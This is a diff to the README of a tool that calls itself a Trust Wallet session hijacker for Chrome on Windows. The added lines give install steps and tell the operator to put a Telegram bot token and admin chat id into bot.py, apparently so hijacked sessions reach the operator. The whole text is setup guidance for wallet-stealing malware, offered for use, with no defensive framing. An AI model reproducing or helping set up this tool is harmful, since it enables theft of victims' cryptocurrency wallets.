@@ -26,3 +26,16 @@ python script for make trust wallet session hijacker in chrome (win) and hijack 
    git clone https://github.com/fploit/TrustWallet_Session_Hijacker
    cd TrustWallet_Session_Hijacker
    ```
+
+2. ** Install python librarys **
+   ```sh
+   pip install -r requirements.txt
+   ```
+
+## Edit Files
+
+1. ** Edit bot.py (add telegram bot token and admin chat id**
+   ```python
+   bot = telebot.TeleBot("TELEGRAM_BOT_TOKEN", parse_mode="html")   # <------- edit this line
+   admin = -1001797987215 #admin chat id                            # <------- edit this line
+   ```
